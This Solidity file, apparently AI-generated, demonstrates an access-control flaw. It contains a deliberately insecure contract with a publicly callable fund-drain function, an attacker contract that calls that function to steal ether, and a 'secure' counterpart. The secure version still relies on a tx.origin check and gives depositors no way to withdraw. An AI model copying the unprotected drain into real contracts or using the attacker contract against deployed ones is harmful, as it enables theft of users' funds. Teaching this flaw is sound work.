// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title GeneralExploitLevelAttackDefense - Full Attack and Defense Simulation for GEL in Web3 Smart Contracts
/// @author ChatGPT

/// @notice Insecure Contract (High General Exploit Level - Public Critical Functions)
contract InsecureGEL {
    mapping(address => uint256) public balances;

    event Drained(address indexed attacker, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function adminDrainFunds(address payable to, uint256 amount) external {
        // BAD: No auth checks! Publicly callable critical drain function!
        (bool success, ) = to.call{value: amount}("");
        require(success, "Drain failed");

        emit Drained(to, amount);
    }
}

/// @notice Secure Contract (Low General Exploit Level - Full Mitigations)
contract SecureGEL {
    address public immutable owner;
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event EmergencyWithdraw(address indexed recipient, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    modifier notContract() {
        require(tx.origin == msg.sender, "Contract call blocked");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable notContract {
        require(msg.value > 0, "Zero deposit");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function emergencyWithdraw(address payable recipient, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient funds");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Withdraw failed");

        emit EmergencyWithdraw(recipient, amount);
    }
}

/// @notice Attack contract simulating high GEL abuse
contract GELIntruder {
    address public targetInsecure;

    constructor(address _targetInsecure) {
        targetInsecure = _targetInsecure;
    }

    function steal(address attackerAddress, uint256 amount) external returns (bool success) {
        (success, ) = targetInsecure.call(
            abi.encodeWithSignature("adminDrainFunds(address,uint256)", attackerAddress, amount)
        );
    }
}
